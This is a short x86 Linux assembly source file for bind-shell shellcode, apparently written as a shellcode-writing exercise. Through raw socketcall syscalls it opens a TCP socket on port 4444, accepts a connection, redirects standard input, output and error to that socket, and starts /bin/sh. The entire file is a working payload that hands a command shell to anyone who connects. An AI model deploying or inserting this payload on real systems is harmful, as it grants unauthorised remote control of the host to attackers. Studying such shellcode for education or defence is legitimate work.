global _start
 
section .text
 
_start:
	xor edx,edx ; clear out edx
	; create socket
	push 0x66
	pop eax ; syscall for socketcall

	push 0x1 
	pop ebx ; SOCKETCALL from net.h = 1

	push edx ; push 0
	push ebx ; value of SOCK_STREAM = 1 got it from header /usr/src
	push 0x2 ; value 2 from /usr/include/i386-linux-gnu/bits/socket.h
	mov ecx,esp ; move ecx to top of the stack
	int 0x80 ; call interrupt


	; store returning socket in esi for further use
	mov esi,eax


	; bind
	
	mov al, 0x66	; socketcall (102)
	pop ebx		; SYS_BIND (2)
	push edx	; INADDRY_ANY (0)
	push word 0x5c11	; htons 4444
	push bx		; AF_INET=PF_INET (2)
	mov edi, esp	; store struct address in edi
	push 0x10	; size = 16
	push edi	; address of struct is pushed onto stack
	push esi	; socketfd
	mov ecx, esp	; point ecx to top of stack 
	int 0x80		; call interrupt
	
	 
	; listen
	
	push 0x66
	pop eax ; syscall for socketcall
	xor ebx,ebx
	mov bl,0x4 ; SYS_LISTEN = 4
	push edx
	push esi
	mov ecx,esp ; finally pointer to arugments stored in ecx
	int 0x80

	; accept

	
	push 0x66
	pop eax ; syscall for socketcall
	inc ebx ; SYS_ACCEPT = 5
	push edx
	push edx
	push esi
	mov ecx,esp ; finally pointer to arugments stored in ecx
	int 0x80

	
	 

	; redirect standard input , output , error to client sock

	mov ebx,eax ; store returned client socket in ebx. ( client sock in ebx )
	xor ecx,ecx
	mov cl,0x2 ; initialize counter to 2

	redirectIO:
		mov al, 0x3f
		int 0x80
		dec ecx
		jns redirectIO
		
		
	; execve /bin/sh

	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp		; /bin//sh
	mov ecx, edx	; NULL
	mov al, 0xb	 ; syscall for execve
	int 0x80
